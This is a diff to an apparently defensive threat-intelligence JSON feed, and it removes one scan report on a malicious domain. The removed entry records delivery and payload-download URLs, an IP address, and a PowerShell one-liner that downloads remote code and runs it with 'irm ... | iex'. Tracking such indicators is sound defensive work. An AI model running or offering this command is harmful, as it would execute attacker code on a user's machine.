@@ -1990,31 +1990,5 @@
     ],
     "ReportId": "cmwdu79y204vg0omlk6z3bhq8",
     "ScannedAt": "2026-11-12T17:43:52.883000+00:00"
-  },
-  {
-    "UrlDomain": "achupallasfarms.co",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/874cc01bf111137b",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/874cc01bf111137b'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/874cc01bf111137b"
-    ],
-    "ReportId": "cmwdt7rly04sw0oml797g7obw",
-    "ScannedAt": "2026-11-12T17:16:16.187000+00:00"
   }
 ]
